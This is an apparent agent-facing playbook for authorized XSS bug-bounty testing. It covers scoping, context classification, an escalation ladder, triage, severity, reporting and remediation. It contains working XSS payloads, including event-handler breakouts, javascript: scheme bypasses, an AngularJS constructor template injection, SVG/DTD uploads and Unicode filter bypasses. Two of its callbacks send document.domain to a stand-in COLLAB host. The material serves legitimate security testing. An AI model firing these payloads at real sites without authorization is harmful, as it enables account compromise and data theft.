---
title: "XSS Testing Playbook — Agent Execution Protocol"
type: playbook
execution: agent
version: 1.0
date: 2026-10-12
evidence_base: 562 public HackerOne reports, 80 programs · plus 207 BugBountyHunter FirstBlood hackevent reports (all bodies retrieved)
source_index: references/source-index.md
firstblood_index: references/firstblood-index.md
canonical_playbooks: [Reflected-XSS.md, Stored-XSS.md, DOM-Based-XSS.md, Context-Based-XSS.md, Filter-Bypass-and-Encoding.md, Framework-and-Template-XSS.md, File-Upload-and-SVG-XSS.md, Self-XSS.md, HTML-Injection.md, Browser-Extension-and-Messaging-XSS.md]
---

# XSS Testing Playbook — Agent Execution Protocol

## 0. How to Use This Document

You are an agent performing **authorized** XSS testing. This document is your procedure.
It is written as phases: each phase states an **Objective**, its **Inputs**, the
**Actions** to take, the **Output** you must produce, and a **GATE** you must pass
before continuing.

**Protocol rules — non-negotiable:**

1. **Never skip Phase 0.** If authorization is not confirmed in writing, you must stop
   and say so. This is not a formality; it is the only thing separating this work from
   unlawful access.
2. **Never skip a GATE.** A failed gate means you go *back*, not forward. Most
   rejected XSS reports fail a gate that was skipped.
3. **Never claim what you did not observe.** If you did not capture a response, you do
   not have a finding. Write "Not observed" — never infer.
4. **Prefer the weakest sufficient test.** Establish markup control before script
   execution. Report the highest rung you actually reached, not the one you hoped for.
5. **Cite evidence.** Every claim needs a raw response excerpt, a DOM snapshot, or a
   header dump. Unverifiable claims get rejected.

**Notation:** `→` is a control-flow step. `GATE n` is a blocking checkpoint. Commands are
templates — substitute real values. All payloads assume an authorized target.

---

## Phase 0 — Intake and Scope Validation `GATE 0`

**Objective.** Establish that you are permitted to test, and what "permitted" covers.

**Inputs.** Program name, program URL, target list, engagement rules.

**Actions.**

1. Retrieve and read the program's policy. Record: in-scope assets, out-of-scope
   assets, testing methods **explicitly forbidden**, rate limits, and whether automated
   scanning is permitted.
2. Match each target against the in-scope list. Record the exact in-scope entry that
   authorises each target. If a target is not explicitly listed, treat it as
   **out of scope** until the program confirms otherwise.
3. Identify prior-art sections. Programs usually exclude issues already listed. Record
   them.
4. Check whether the program pays for self-XSS, HTML injection, and informational
   findings. This changes where you spend effort.

**Output.** A scope table: `target | in-scope basis | rate limit | forbidden methods | prior art noted`.

**`GATE 0`** — Proceed only if every target you intend to test has an in-scope basis.
If not, **drop the target and say so in your report**. Do not test it "just to check."

> **Evidence note.** In the corpus behind this playbook, 103 of 562 sources had the
> original report body withheld by the platform and only the program's official
> summary survived. Programs do publish prior art. Checking it is not optional.

---

## Phase 1 — Attack Surface Mapping `GATE 1`

**Objective.** Enumerate every input you can reach and every sink you can observe.

**Actions.**

1. **Crawl and archive.** Walk the application; for each page record its URL, auth
   state, and the query parameters it accepts.
2. **Prioritise by reachability.** Reflected XSS lives on unauthenticated,
   link-shareable GET surfaces. Rank inputs:

   | Rank | Surface | Why |
   | --- | --- | --- |
   | 1 | Unauthenticated GET params on public pages | No precondition; link-deliverable |
   | 2 | Unauthenticated marketing/partner subdomains | Least threat-modelled; highest yield in the corpus |
   | 3 | Error pages and safety interstitials | Built by separate, less-reviewed code |
   | 4 | Search, filter, locale, category, pagination | Highest reflection density |
   | 5 | Post-auth fields written by low-privilege users | Stored-XSS candidates |
   | 6 | Admin-configured strings (labels, formats, templates) | Rendered to *other* admins |
   | 7 | Upload endpoints | See Phase 5 route R5 |

3. **Enumerate the JS surface.** Download bundles; record frameworks and versions:

   ```bash
   # newly authored — run against an authorised target
   curl -s "$URL" | grep -oE 'src="[^"]+\.js[^"]*"' | sort -u > js_urls.txt
   cat js_urls.txt | xargs -I{} curl -s "{}" > bundle.js
   grep -oE 'angular[^,;]{0,40}' bundle.js | head   # AngularJS?
   grep -c '_.template' bundle.js                    # lodash templates?
   ```

   Record the **version** where discoverable (`angular.version` in the console). Version
   determines which techniques apply.
4. **Enumerate third-party code.** Extensions the program ships, CDN scripts, embedded
   widgets, messaging listeners, file-upload hosts. Each is a separate trust boundary.
5. **Enumerate non-browser sinks.** Any user input reaching an **email, SMS, push
   notification, PDF, CSV export, or log file**. These are systematically under-tested
   and are a genuine finding class on their own.
6. **Resurrect dead parameters.** WayBackMachine's archived raw HTML for the same
   pages exposes names the live form no longer sends — *"an old input,
   <input type='hidden' name='ref' value=''> that was used 3 years ago. The parameter
   isn't in the HTML today, however the code for it may still be there!"* (BBH-004
   wayback guide, read 2026-10-17). Try archived names against live endpoints; vendor
   robots.txt history extends endpoint maps the same way.

**Output.** `surfaces.md` — a table of `surface | inputs | auth required | suspected sinks | notes`.

**`GATE 1`** — Proceed when you have at least one input per Rank 1–4 surface. If the
target has none, re-rank; do not proceed to blind fuzzing.

---

## Phase 2 — Reflection Detection

**Objective.** Determine which inputs are reflected, and precisely where.

**Actions.**

1. **Use a unique inert marker.** Never use a generic string — collisions corrupt your
   analysis.

   ```
   H1XSSMARKER9
   ```

   One marker per parameter, so you can tell them apart: `H1XSS_A_9`, `H1XSS_B_9`, …

2. **Search the raw response** (before the browser parses it):

   ```bash
   # newly authored
   curl -s "$URL_WITH_MARKER" | grep -o -b -E '.{60}H1XSSMARKER9.{60}'
   ```

   `-b` gives you the byte offset. Record it.

3. **Also search the rendered DOM** — a reflection visible in the raw response may not
   reach the DOM (e.g. inside a `<script>` string), and vice versa.
4. **Handle responses that differ per request** (CSRF tokens, nonces). Diff two
   identical requests to find the volatile fields before concluding anything.
5. **Check headers, not just the body.** A value in a `Location` header is a
   different vulnerability class (open redirect) — route to Phase 7.
6. **Treat headers as *inputs*, not only as outputs.** User-Agent and Referer are
   frequently stored and rendered in staff-only monitors — blind XSS territory
   (FirstBlood FB-610/FB-678/FB-694 stored User-Agent-header payloads in the
   vaccination portal). Send a blind-XSS marker in UA/Referer on any endpoint that
   persists request metadata (the guide's rule: *"Test every parameter/header with a
   blind XSS payload as you have no idea how they handle it on the backend"*).

**Output.** `reflections.csv`: `parameter | surface | reflected? | byte offset | raw context | DOM present?`

**Decision.** Parameters with no reflection are **out** for reflected testing. Record
them and move to stored testing (Phase 3 route R2) — absence of reflection says nothing
about persistence.

> **Evidence note.** In the corpus, `CONT-126` (Uber, $3,000) was a single unescaped
> `utm_campaign` marketing parameter on a non-core subdomain. Effort-to-yield strongly
> favours Rank 2 surfaces.

---

## Phase 3 — Context Classification `GATE 2`

**Objective.** Determine the **output context** of each reflection, then route.

This is the highest-leverage decision in the entire playbook. Testing a JavaScript-context
string with an HTML payload wastes the whole cycle, and mis-classified context produces
false positives that waste triage.

**Actions.**

1. Extract the 60 bytes before and 60 after the marker from the raw response.
2. Classify into exactly one row:

| # | Context | How to detect | Dangerous chars | Rung-1 probe |
| --- | --- | --- | --- | --- |
| C1 | HTML text node | Marker sits between tags, not in an attribute | `<` `>` | `"><h1>xss-marker` |
| C2 | HTML attribute, quoted | Inside `attr="…"` or `attr='…'` | the delimiting quote | `" onmouseover="xss-marker` |
| C3 | HTML attribute, unquoted | Inside `attr=…` with no quote | space, `>`, `` ` ``, `=`, `/` | ` onmouseover=xss-marker` |
| C4 | JS string, single-quoted | Inside `'…'` in a `<script>` block | `'` `\` newline | `';xss-marker;//` |
| C5 | JS string, double-quoted | Inside `"…"` in a `<script>` block | `"` `\` newline | `";xss-marker;//` |
| C6 | JS code position | Inside `<script>` but outside any string | `;` `(` `)` | `;xss-marker;//` |
| C7 | URL / `href` / `src` | Inside `href=`, `src=`, `url=`, or a redirect target | scheme, whitespace | `javascript:xss-marker//` |
| C8 | `<script>` block terminator | Value precedes a `<script>` tag | `</script>` | `</script><h1>xss-marker` |
| C9 | HTML comment | Inside `<!-- … -->` | `--`, `>` | `--> <h1>xss-marker` |
| C10 | Template expression | Inside `{{ }}`, `${ }`, `{% %}`, `{# #}` | template syntax | `A{{7*7}}B` |
| C11 | Non-browser sink | Value reaches email/SMS/PDF/CSV/log | HTML, for the consumer | `<a href="https://COLLAB/">click</a>` |
| C12 | Inert / dead | Reflected but always escaped, or in a `data-*` never read | none | n/a → discard |
| C13 | Logged request metadata | Value lands in a staff-only record: login-attempt logs, failed-login monitors, upload metadata tables | `<` `>` `"` | blind-XSS marker (XSSHunter); **no client feedback — verdict comes from the callback** |
| C14 | Hidden store-time parameter | A POST that the UI sends never includes a field the render site displays; manual param name derived from a sibling render | `<` `>` `"` | add e.g. `message=` to the cancel/update POST; verify on the **render site** as a second principal |

3. **C10 special handling.** Evaluate `A{{7*7}}B`. If the output is `A49B`, the input is
   **being compiled as a template** — route R6. If it is still literal, it is not
   template injection. This arithmetic probe is non-executing and decisive; use it first.
4. **C11 special handling.** Do **not** test with `alert(1)`. Mail clients sanitise
   inconsistently and block scripts. Test with phishing-grade markup and an external
   image reference (§8, rung 3).
5. **C12 → discard.** Record it as a reflection with no vulnerability. Do not report.
6. **C13 special handling.** You cannot observe C13 locally — the execution happens in
   a staff-only dashboard you do not control. Submit a self-hosted XSSHunter payload
   (or superficially equivalent callback collector) into the *logged* field and wait;
   the corpus shows turnaround can be ~24 h (FB-1559, FirstBlood v3). The class was
   found by reading *the site's own hints* — *"Login attempts will be logged"* — so
   mine every informational banner for backend-handling promises. FirstBlood case
   studies: FB-1310/FB-1320/FB-1559 in [`Stored-XSS.md`](Stored-XSS.md).
7. **C14 special handling.** The FirstBlood corpus' flagship stored XSS lives behind a
   parameter **the normal UI never sends**: cancel-appointment without a message, but
   the doctor panel displays one (FB-078/FB-082/FB-133). When a record shows a render
   field this request does not populate, replay the state-changing POST with the
   parameter added. Confirm execution on the *render* site as a second principal.

**Output.** Add a `context` column to `reflections.csv`.

**`GATE 2`** — Every parameter you advance must have exactly one context assigned.
Unclassified parameters go back to this phase.

> **Evidence note.** The corpus is dominated by context errors. `REFL-056` reflected
> into a single-quoted JS string where only `'` mattered; `REFL-025` into an **unquoted**
> attribute where a *space* was enough — quoting the attribute would have fixed it with
> no escaping at all.

---

## Phase 4 — Routes

Five routes. Enter exactly one per finding; a single defect may require two (see §6.2).

---

### Route R1 — Reflected XSS (contexts C1–C9)

Deep reference: **`Reflected-XSS.md`**

**Actions.**
1. Work the escalation ladder (§8) in order. **Stop at the first rung that works.**
2. For C2/C3, test quote break-out *before* tag injection — it frequently succeeds
   where tag injection fails and produces a stronger finding.
3. For C7, always test scheme bypass variants: `javascript:`, `JaVaScRiPt:`,
   `java\tscript:`, `&#106;avascript:`, `javascript://host/path`.
4. Confirm execution origin with `document.domain`, not a bare alert.
5. **Read the response `Content-Security-Policy`.** Record it verbatim. If it blocks
   execution, report that honestly and scope severity accordingly.

**Output.** Finding with `context`, `highest rung reached`, `CSP value`, `origin`.

**Gate.** Did you observe actual execution in the target origin? If not → see §6.

---

### Route R2 — Stored XSS

Deep reference: **`Stored-XSS.md`**

**Actions.**
1. **Write as a low-privilege user.** Target fields: display names, comments, org and
   team labels, feature names, file metadata, integrations, notifications.
2. **Store a marker first.** Confirm it renders escaped to you. This distinguishes a
   cosmetic issue from a real one.
3. **Log out. Log in as user B. Load the page.** This step is mandatory and is the
   single highest-value action in this route. **Self-triggered execution is self-XSS,
   not stored XSS** → reroute to R4.
4. **Trace every render path.** Grep the stored value across the app: profile page,
   activity feed, admin panel, exports, notification emails, APIs. A value escaped on
   the profile page is frequently unescaped in the admin panel — that is where the
   severity lives.
5. **Enumerate sibling widgets deliberately.** The corpus contains two independent
   reports where one widget accepted a payload its sibling rejected. Ask "which other
   widgets use this component?" and test them.
6. **For admin-configured strings** (formats, labels, templates), test with a **second
   administrator account**. Writer and viewer must be different principals.
7. Test erasure: confirm the payload is removed from storage on delete, and report the
   result.
8. **Add the parameter the UI never sends.** The FirstBlood corpus' flagship case
   family (FB-078/082/133/189/202/208) injects through a hidden store-time `message`
   parameter on the cancel-appointment POST — the render site displays the field, the
   form never sends it. Any record type that *displays* a field its creation/update
   POST does not *send* is a C14 candidate: replay the POST with the field added.

**Output.** Finding with `writer principal`, `viewer principal`, `viewer privilege
level`, `render paths affected`.

**Gate.** Did a **second user** trigger it? If not → R4.

---

### Route R3 — DOM-Based XSS

Deep reference: **`DOM-Based-XSS.md`**

**Actions.**
1. Enumerate sinks in downloaded bundles:

   ```bash
   # newly authored
   grep -rnoE "(innerHTML|outerHTML|insertAdjacentHTML|document\.write|setHTMLUnsafe|\.html\(|eval\(|new Function|setTimeout\(['\"]|location\.hash|document\.referrer|document\.URL|window\.name|addEventListener\(['\"]message)" bundle.js
   ```

2. For each sink, **trace backwards** to a reachable attacker-controlled source. A sink
   fed by a constant is a false positive.
3. **Test the fragment first** (`#H1XSSDOM9`), then parameters read by JS.
4. **Prove the payload was never transmitted.** Open DevTools → Network → reload →
   confirm no request contains it. Paste this proof in the report. It is the claim that
   distinguishes DOM XSS from reflected XSS, and reviewers check for it.
5. For `postMessage` listeners: check `event.origin` validation *before* any use of
   `event.data`, then probe **data shape** — send a string, an array, a nested object,
   and objects overriding `toString`/`valueOf`. A sanitiser that only handles strings is
   bypassable.
6. For `location = value` sinks, test scheme allow-listing (§8 rung 4).
7. **Attribute your payload.** If the injecting code belongs to a third party, say so
   explicitly and check whether that party is in scope.

**Output.** Finding with `source`, `sink line`, `network-capture proof`, `origin`.

**Gate.** Did the payload appear in **no** HTTP request? If yes → this is reflected XSS
(R1); re-file there.

---

### Route R4 — Self-XSS

Deep reference: **`Self-XSS.md`**

**Actions.**
1. Confirm it fires in **your own** account. If you cannot reproduce it, you have no
   finding.
2. **Immediately test the multi-user path** (R2 step 3). If a second user triggers it,
   you have stored XSS — stop and reroute.
3. **Reframe the finding as a broken control.** Identify what the feature was supposed
   to guarantee:
   - *URL validation field* → the defect is missing scheme allow-listing.
   - *Edit form re-population* → the defect is missing output encoding on the edit path.
   - *Masked password reveal* → the defect is missing encoding on the echo path.
   Lead your report with the **control**, not the payload. In the corpus, this framing
   was the difference between $750 and $100 for materially similar bugs.
4. **Hunt the second primitive.** For each self-XSS, test whether CSRF, login CSRF,
   session fixation, open redirect, or referrer control can deliver the payload without
   victim interaction. If so, the finding's severity is the **chain's** severity.
5. Test alternate trigger paths — hover-then-edit, preview, export — not just the
   primary view.

**Output.** Finding with `broken control`, `chain analysis result`.

**Gate.** Can another user trigger it? If yes → R2.

---

### Route R5 — File Upload and SVG

Deep reference: **`File-Upload-and-SVG-XSS.md`**

**Actions.**
1. Upload a benign SVG marker:

   ```xml
   <svg xmlns="http://www.w3.org/2000/svg" width="1" height="1"
        onload="document.title='H1XSSMARKER9'"><text x="0" y="10">xss-marker</text></svg>
   ```

2. Fetch the file's **direct URL** and dump headers:

   ```bash
   # newly authored
   curl -sI "$FILE_URL" | grep -iE '^(content-type|content-disposition|x-content-type-options)'
   ```

3. **Judge by the header, not the extension.**
   `image/svg+xml` → exploitable. `text/plain` → inert.
   `application/octet-stream` **without** `nosniff` → possibly sniffable.
4. Test the **extension-rename** differential: request the same object as `.svg`,
   `.html`, `.xml`, and with no extension.
5. If the app allow-lists SVG attributes, test the **DTD/entity bypass**:

   ```xml
   <?xml version="1.0" encoding="ISO-8859-1"?>
   <!DOCTYPE svg [ <!ENTITY elem "marker"> ]>
   <svg xmlns="http://www.w3.org/2000/svg" width="1" height="1"
        onload="document.title='&elem;'">&elem;</svg>
   ```

6. Test **mime sniffing**: put `<html><script>` at offset 0 of a binary upload; confirm
   whether `nosniff` is present.
7. **Measure origin isolation** rather than assuming it. From the serving origin, check
   `document.cookie`, `localStorage`, `sessionServiceWorker`. A "sandbox" subdomain is a
   weak control, not an absent one — the corpus has a researcher arguing exactly this,
   and no source tested it.

**Output.** Finding with `served Content-Type`, `disposition`, `nosniff` present?,
`origin-reachable state` list.

---

### Route R6 — Framework and Template Injection

Deep reference: **`Framework-and-Template-XSS.md`**

**Actions.**
1. Identify engine and **version**.
2. **Arithmetic probe first** — non-executing, decisive, unarguable:

   ```
   ?q=A{{7*7}}B        → A49B means compiled
   ?p=A${7*7}B         → A49B means compiled (lodash)
   ```

   If the braces echo literally, there is **no** template injection. Stop.
3. Check the **rendered source**, not the HTTP response — a client-side engine never
   touches the response.
4. Only then escalate, using a marker rather than an alert:

   ```js
   {{constructor.constructor('document.title="H1XSSMARKER9"')()}}
   ```

5. For escaping-engine cases, trace **second sinks**: if an escaped value lands in an
   attribute whose contents are re-parsed by another engine, the escaping is bypassable
   by design. This was the exact root cause of a `high`-rated corpus report.
6. If user input is ever passed as the **template string** to `_.template`/`$compile`,
   that is an eval primitive — report it as such.

**Gate.** Did output actually change (`7*7` → `49`)? If not → discard.

---

### Route R7 — Browser Extensions and Messaging

Deep reference: **`Browser-Extension-and-Messaging-XSS.md`**

**Actions.**
1. **`postMessage`:** locate every listener. Verify `event.origin` validation occurs
   before any processing. Probe from a non-matching origin first. Then probe data shape
   (§Phase 4 R3 step 5). Verify `event.data` is coerced to a primitive *before*
   sanitisation.
2. **Embedded-app / plugin SDKs:** confirm that installing a malicious extension is
   **in scope**. Enumerate every SDK method that renders a value or accepts a URL. Test
   `href`-like parameters for scheme validation.
3. **Your own extension:** audit every DOM write; treat **all** remote data — usernames,
   repo names, titles, URLs — as untrusted. Test on the *host* site's origin, because
   that is where execution lands.
4. **Include an ownership disclaimer.** Name what is yours and what is not. State which
   inputs you do not own.

---

### Route R8 — Filter Bypass and Encoding

Deep reference: **`Filter-Bypass-and-Encoding.md`**

**Actions.**
1. **Establish the baseline.** Send `<script>alert(1)</script>` and confirm it is
   blocked. **Without this you cannot demonstrate a bypass**, and the report will be
   closed as a duplicate of the known filter.
2. Identify the filter's shape (§7 table) and select the matching probe family.
3. Run the encoding-depth grid and the Unicode probe set (§8).
4. Confirm the bypass by showing **both** halves in the report: blocked baseline +
   executing variant.
5. Link the filter's source code if you can find it. In the corpus, a report that linked
   exact GitHub source lines was materially faster to triage.
6. If the filter is client-side, read it. A `stripHtml` implemented as
   `innerHTML` + regex is bypassable — and one corpus report was explicitly a **bypass
   of a previously shipped regex**.

**Gate.** Did you demonstrate the baseline block? If not → this is not a bypass report.

---

## Phase 5 — Escalation Ladder `GATE 3`

**Objective.** Establish the *strongest true* claim, and no stronger.

Work in order. Stop at the first rung that succeeds. Report the highest reached.

| Rung | Probe (context-appropriate) | Establishes |
| --- | --- | --- |
| 0 | `H1XSSMARKER9` | Reflection exists |
| 1 | `"><h1>xss-marker` | Markup control |
| 2 | `"><img src=x onerror=alert(1)>` | Event-handler injection |
| 3 | `</script><svg onload=alert(1)>` | Tag/context break-out |
| 4 | `javascript:alert(1)` | Scheme injection |
| 5 | `constructor.constructor('…')()` / `A{{7*7}}B` | Template/eval primitive |
| 6 | Read `document.domain`, or same-origin `fetch` | **Origin-level execution** |

**Preference — use rung 6, not a bare alert.** A bare `alert(1)` proves something ran.
Reading `document.domain` proves *where* it ran, which is the entire question. It is also
less disruptive to the target and less likely to trip their alerting.

**Safe external-resource proof** (works in email, PDFs, and CSP-restricted pages):

```html
<img src="https://COLLAB/?rendered=1&domain=" width="1" height="1"
     onerror="new Image().src='https://COLLAB/?domain='+document.domain">
```

A hit proves rendering *and* execution origin in one artefact.

**`GATE 3`** — You must be able to state, precisely: *"Attacker input reaches a
`<context>` in `<origin>` and executes in that origin."* If any element of that sentence
is unverified, you are not ready to report.

---

## Phase 6 — Validation and Triage `GATE 4`

Most XSS reports die here. Run every check.

**6.1 Gates — all must pass:**

| # | Gate | Fails if |
| --- | --- | --- |
| V1 | Execution observed | You inferred it. No screenshot/DOM/header evidence → fail |
| V2 | Correct origin | Payload ran on an attacker origin, not the target's |
| V3 | Correct route | Self-XSS filed as stored, or DOM XSS sent the payload to the server |
| V4 | Context stated | Report says "XSS" without naming the output context |
| V5 | Preconditions disclosed | A required login, role, or value is omitted |
| V6 | CSP disclosed | A CSP exists and you did not mention it |
| V7 | Browser stated | You did not record browser and version |
| V8 | Chain demonstrated | You assert takeover/phishing you did not walk |
| V9 | Not prior art | An equivalent report is already listed |
| V10 | Minimal PoC | The payload is maximal, destructive, or exfiltrates data |
| V11 | Reproduction is clean | It depends on your session state, timing, or an artifact you didn't attach |

**6.2 Multi-primitive findings.** If the victim must both click a link *and* the payload
succeeds, state both. If a finding becomes XSS only via CSRF, that is a **chain** —
report the chain as the primary issue, with XSS as a component. Corpus precedent: a
single report bundled login CSRF + open redirect + self-XSS, and the self-XSS was the
weakest of the three.

**6.3 Common false positives — check each explicitly:**

- ❌ **Reflection ≠ XSS.** Confined to an escaped text node. Discard.
- ❌ **Markup ≠ XSS.** You reached rung 1 and not rung 2. Report as HTML injection.
- ❌ **Pre-save only.** Renders in the editor, inert after save. The corpus has a
  report that established precisely this and correctly declined to claim XSS.
- ❌ **CSP blocks it.** Report the ceiling honestly. This *raised* credibility in the
  corpus — a researcher who noted a CSP blocked them still got paid.
- ❌ **IE-only.** State the scope; verify against a current browser before claiming.
- ❌ **Third-party code.** Not your target unless the vendor is in scope.
- ❌ **Filter weakness with no execution.** Report the filter, not an XSS.
- ❌ **Dead value.** Reflected but never read.

**`GATE 4`** — Proceed only when V1–V11 all pass. Document each in the report.

---

## Phase 7 — Severity Determination

**Objective.** Argue severity from evidence, and state the ceiling honestly.

**Severity is set by two variables, not by the payload:**
1. **Who executes the script?** (who is the viewer?)
2. **What is the origin's trust value?** (what does the victim believe about it?)

**7.1 Anchors from the corpus.** These are *recorded* values, not recommendations:

| Case | Viewer | Recorded severity | Bounty |
| --- | --- | --- | --- |
| Payload fires in an **admin panel** | administrator | high | $5,000 |
| Payload fires **origin-wide** (all shops, any visitor) | any user | — | $3,000 |
| Payload on a **marketing subdomain** | any visitor | — | $3,000 |
| Payload on a **UGC surface**, ordinary users | other users | medium | $1,000 |
| **CSP blocks execution** | any user | low | $450 |
| **Self-XSS**, no broken control shown | self only | low | $100–750 |

Note the driver: the admin-panel case and the UGC case differ **5×**, on identical
payloads, because the viewer differs.

**7.2 Requirements.**

1. **State the viewer explicitly.** "Stored XSS" is weak. "Stored XSS executing in the
   admin panel when an administrator views the activity log" is a severity.
2. **Check and disclose cookie flags.** If the vulnerable origin has no valuable session
   cookie, say so. In the corpus a researcher volunteered that the host *"has no
   valuable cookies at all"* and reframed the impact as phishing — an honest ceiling that
   should be copied.
3. **Only claim what you walked.** Chains must be demonstrated end to end. Referencing a
   separate report as a second stage is legitimate; asserting a chain you have not
   executed is not.
4. **Use published metrics only when the source publishes them.** In this corpus, only
   one XSS report carries a complete sourced vector:
   **CVSS v3 3.5 (AV:N/AC:L/PR:L/UI:R/S:U/C:L/I:N/A:N)**, CWE-79, rated low, $450, with
   CVE-2017-0891. Do not compute or invent CVSS/CWE for this knowledge base.
5. **Defences reduce impact; they do not remove the defect.** Report a working CSP as
   mitigation *and* still report the escaping gap. The best-documented case did exactly
   that.

---

## Phase 8 — Payload Reference

All probes assume an authorized target. Prefer inert markers; escalate only on targets
you are permitted to test.

**8.1 Context probe matrix**

| Context | Inert | Executable |
| --- | --- | --- |
| HTML text (C1) | `<h1>xss-marker` | `<img src=x onerror=alert(1)>` |
| Attribute quoted (C2) | `" onmouseover="xss-marker` | `" onmouseover="alert(1)` |
| Attribute unquoted (C3) | ` onmouseover=xss-marker` | ` onmouseover=alert(1)` |
| JS single-quoted (C4) | `';xss-marker;//` | `';alert(1);//` |
| JS double-quoted (C5) | `";xss-marker;//` | `";alert(1);//` |
| JS code (C6) | `;xss-marker;//` | `;alert(1);//` |
| URL (C7) | `javascript:xss-marker//` | `javascript:alert(1)//` |
| Script terminator (C8) | `</script><h1>xss-marker` | `</script><svg onload=alert(1)>` |
| Comment (C9) | `--> <h1>xss-marker` | `--><svg onload=alert(1)>` |
| Template (C10) | `A{{7*7}}B` | `{{constructor.constructor('document.title="H1XSSMARKER9"')()}}` |
| Email/export (C11) | `<a href="https://COLLAB/">click</a>` | `<img src="https://COLLAB/p.gif">` |

**8.2 Encoding-depth grid** — run all depths against a blocked parameter; bypasses hide
in this grid:

```bash
# newly authored — authorised targets only
BASE='https://TARGET/endpoint?p='
PAYLOAD='"><h1>xss-marker'
for enc in raw url doubleurl htmlentity; do
  case $enc in
    raw)        v="$PAYLOAD" ;;
    url)        v=$(python3 -c 'import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1]))' "$PAYLOAD") ;;
    doubleurl)  v=$(python3 -c 'import urllib.parse,sys;print(urllib.parse.quote(urllib.parse.quote(sys.argv[1])))' "$PAYLOAD") ;;
    htmlentity) v='&#34;&gt;&lt;h1&gt;xss-marker' ;;
  esac
  echo "== $enc -> ${BASE}${v}"
done
```

**8.3 Unicode probe set** — the standing test for any character-level filter:

| Probe | Codepoint | Resembles |
| --- | --- | --- |
| `＜` | U+FF1C | `<` |
| `＞` | U+FF1E | `>` |
| `＂` | U+FF02 | `"` |
| `‹` | U+2039 | `<` |
| `›` | U+203A | `>` |
| `　` | U+3000 | space |
| `%00` | NUL | terminator |

Both a fullwidth-bracket bypass and a mixed-Unicode bypass are documented in the corpus
at `medium`/`$1,000`, with the payload `†‡•＜img src=a onerror=javascript:alert('hacked')>…‰€`
published in full by the program. That string is a ready-made regression test.

**8.4 Regex non-match probes** — for any tag-stripping filter, test inputs it will not
match: `<a/`, `<:`, `<3`, `</ x`, `<<h1>`. A documented client-side `stripHtml` using
`/<\/?\w+[^>]*\/?>/g` was bypassed by `<a/` and `<:`.

**8.5 Scheme bypass probes** — for C7 and URL-validation fields:
`JaVaScRiPt:`, `java\tscript:`, `&#106;avascript:`, `javascript://host/path`,
`data:text/html,<h1>xss-marker`, `vbscript:alert(1)`.

**8.6 Out-of-band receiver** — for blind sinks and cross-origin proof:

```html
<img src="x" onerror="new Image().src='https://COLLAB/?d='+document.domain+'&p='+location.pathname">
```

Use `window.name` capture if cookies are unreadable. **Never file a blind XSS without a
received callback.**

---

## Phase 9 — Reporting

**Objective.** Produce a report a triager can verify without re-deriving your work.

**Required elements, in order:**

1. **Title** — `[Context] XSS in <feature> via <parameter>`. Name the context; never
   write "XSS" alone, and never write "Generic".
2. **Summary** — one paragraph: input → context → origin → consequence.
3. **Severity** — rating plus the viewer/trust argument, plus CSP status.
4. **Affected endpoint** — full URL with parameter, program name, date tested.
5. **Vulnerability details** — input-to-output flow, with the byte-exact reflection point
   and the offending code if you have it.
6. **Proof of concept** — the ladder, staged: inert → markup → execution. Include the raw
   response excerpt with the reflection highlighted.
7. **Remediation** — context-appropriate. Do not propose a fix you have not tested.
8. **Environment** — browser and version, date, headers relied upon.

**Templates** — full, copy-adaptable report templates for each route live in
§12 of the corresponding canonical playbook:
[`Reflected-XSS.md`](Reflected-XSS.md) · [`Stored-XSS.md`](Stored-XSS.md) ·
[`DOM-Based-XSS.md`](DOM-Based-XSS.md) · [`Self-XSS.md`](Self-XSS.md) ·
[`File-Upload-and-SVG-XSS.md`](File-Upload-and-SVG-XSS.md) ·
[`Framework-and-Template-XSS.md`](Framework-and-Template-XSS.md) ·
[`HTML-Injection.md`](HTML-Injection.md) ·
[`Browser-Extension-and-Messaging-XSS.md`](Browser-Extension-and-Messaging-XSS.md) ·
[`Filter-Bypass-and-Encoding.md`](Filter-Bypass-and-Encoding.md) ·
[`Context-Based-XSS.md`](Context-Based-XSS.md)

**9.1 Reporting discipline — what consistently survives triage:**

- **Disclose limitations before the triager finds them.** CSP, IE-only scope, missing
  cookie value, unverified chain. Volunteering these *raised* credibility in the corpus
  and did not cost a bounty in a single recorded case.
- **State what you did NOT achieve.** "Arbitrary JS cannot be executed without a CSP
  bypass" earned payment, not rejection.
- **Include the blocked baseline** on filter bypasses, or the report reads as a
  duplicate.
- **Cross-reference prior art** in your opening line when you find a sibling bug.
- **Use `document.domain` / a collaborator callback**, not a bare alert.
- **Never fabricate.** No invented endpoints, payloads, browser behaviour, root causes,
  impact, severity, CVSS, CWE, bounty, or dates. Where a fact is unknown, write
  *"Not disclosed"* / *"Not observed"* and say what you would need to determine it.

**9.2 Explicitly forbidden in a report:**
invented CVSS vectors · invented CWE mappings not published by the vendor · claimed
impact you did not demonstrate · payloads exfiltrating real user data · destructive
proofs · testing outside `GATE 0` scope.

---

## Phase 10 — Remediation and Regression Testing

**Objective.** Leave the target better defended and *verifiably* so.

**10.1 Context-correct controls** — the encoder must match the context:

| Context | Control |
| --- | --- |
| HTML text | Encode `& < > " '` |
| HTML attribute | Build via DOM APIs; if concatenating, quote **and** encode |
| JavaScript string | `textContent`, or `JSON.stringify` into a `<script type="application/json">` block |
| URL / `href` | Scheme allow-list; reject `javascript:`, `data:`, `vbscript:` after decoding |
| Non-browser sink | Escape in the email/export/PDF template layer; never interpolate raw |

**Never** hex-encode as a fix — a corpus researcher proposed it; it is a blacklist-shaped
answer to an allow-list-shaped problem.

**10.2 Regression test suite** — author these alongside the finding:

| Test | Asserts |
| --- | --- |
| Context-appropriate payload at the reflection point | encoded form present, raw form absent |
| Same payload stored as user A, rendered by user B | cross-user path encoded |
| Same, across **every** render path found (feed, admin, export, email) | no path missed |
| The exact bypass probe from §8 | the specific regression cannot recur |
| Unicode probe set (§8.3) | ASCII-only filters cannot be reintroduced |
| Scheme probes (§8.5) in every URL field | allow-list holds |
| `postMessage` from an unlisted origin, and with object payloads | origin + coercion enforced |
| Uploaded SVG with `<!DOCTYPE … ENTITY>` | DTD rejected or stripped |
| Uploaded file headers | safe `Content-Type`, `nosniff`, `attachment` |
| Template probe `A{{7*7}}B` | output literal, not `A49B` |
| CSP without `unsafe-inline` | defence in depth |

---

## Phase 11 — Post-Reporting `GATE 5`

**Actions.**
1. **Check `GATE 5`:** can a triager reproduce from your report alone, without asking you
   a question? If not, you are not done — add the missing artefact.
2. Deduplicate against your own earlier reports; consolidate one root cause into one
   report with all reproductions.
3. Record what you did **not** test, so a future engagement resumes rather than restarts.
4. Persist state to disk as you go. Interrupted research should resume without
   duplicating work.

**`GATE 5`** — Report is self-contained, reproducible, and honest about its limits.

---

## Appendix A — Filter Shape Selection (Route R8)

